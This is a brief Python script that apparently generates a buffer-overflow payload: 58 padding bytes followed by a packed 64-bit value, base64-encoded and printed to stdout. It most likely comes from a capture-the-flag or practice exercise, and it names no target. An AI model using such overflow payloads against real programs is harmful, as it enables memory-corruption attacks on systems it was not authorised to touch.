
import sys
import struct
import base64

buf = b'bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb'
buf += struct.pack('<Q', 1226742193821220278)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
